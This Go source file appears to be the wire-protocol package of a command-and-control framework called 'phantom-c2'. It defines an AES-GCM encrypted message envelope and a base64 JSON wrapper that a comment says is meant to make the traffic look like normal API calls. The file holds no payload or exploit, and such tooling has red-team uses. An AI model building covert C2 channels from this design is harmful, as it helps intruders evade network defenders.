package protocol

import (
	"encoding/binary"
	"encoding/json"
	"errors"

	"github.com/phantom-c2/phantom/internal/crypto"
)

// Envelope is the encrypted wire format for all messages after registration.
// Format: [Version:1][Type:1][KeyID:8][Nonce+Ciphertext:variable]
type Envelope struct {
	Version uint8  `json:"-"`
	Type    uint8  `json:"-"`
	KeyID   [8]byte `json:"-"`
	Payload []byte `json:"-"` // AES-GCM encrypted (nonce prepended)
}

// HTTPWrapper is the JSON wrapper for HTTP transport.
// The encrypted envelope is base64-encoded inside this to look like normal API traffic.
type HTTPWrapper struct {
	Data      string `json:"data"`
	Timestamp int64  `json:"ts"`
}

// EnvelopeToBytes serializes an Envelope to raw bytes for encryption.
func EnvelopeToBytes(env *Envelope) []byte {
	// [Version:1][Type:1][KeyID:8][PayloadLen:4][Payload:N]
	buf := make([]byte, 0, 1+1+8+4+len(env.Payload))
	buf = append(buf, env.Version)
	buf = append(buf, env.Type)
	buf = append(buf, env.KeyID[:]...)

	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(env.Payload)))
	buf = append(buf, lenBuf...)
	buf = append(buf, env.Payload...)

	return buf
}

// EnvelopeFromBytes deserializes raw bytes into an Envelope.
func EnvelopeFromBytes(data []byte) (*Envelope, error) {
	if len(data) < 14 { // 1+1+8+4 minimum
		return nil, errors.New("envelope too short")
	}

	env := &Envelope{
		Version: data[0],
		Type:    data[1],
	}
	copy(env.KeyID[:], data[2:10])

	payloadLen := binary.BigEndian.Uint32(data[10:14])
	if uint32(len(data)-14) < payloadLen {
		return nil, errors.New("envelope payload length mismatch")
	}

	env.Payload = data[14 : 14+payloadLen]
	return env, nil
}

// WrapForHTTP wraps an Envelope in a JSON HTTP wrapper.
func WrapForHTTP(env *Envelope, timestamp int64) ([]byte, error) {
	raw := EnvelopeToBytes(env)
	wrapper := HTTPWrapper{
		Data:      crypto.Base64Encode(raw),
		Timestamp: timestamp,
	}
	return json.Marshal(wrapper)
}

// UnwrapFromHTTP extracts an Envelope from a JSON HTTP wrapper.
func UnwrapFromHTTP(body []byte) (*Envelope, error) {
	var wrapper HTTPWrapper
	if err := json.Unmarshal(body, &wrapper); err != nil {
		return nil, err
	}

	raw, err := crypto.Base64Decode(wrapper.Data)
	if err != nil {
		return nil, err
	}

	return EnvelopeFromBytes(raw)
}

// SealEnvelope creates an encrypted Envelope from plaintext payload.
func SealEnvelope(msgType uint8, sessionKey []byte, payload []byte) (*Envelope, error) {
	encrypted, err := crypto.AESEncrypt(sessionKey, payload)
	if err != nil {
		return nil, err
	}

	keyID := crypto.SessionKeyID(sessionKey)

	return &Envelope{
		Version: ProtocolVersion,
		Type:    msgType,
		KeyID:   keyID,
		Payload: encrypted,
	}, nil
}

// OpenEnvelope decrypts an Envelope and returns the plaintext payload.
func OpenEnvelope(env *Envelope, sessionKey []byte) ([]byte, error) {
	return crypto.AESDecrypt(sessionKey, env.Payload)
}
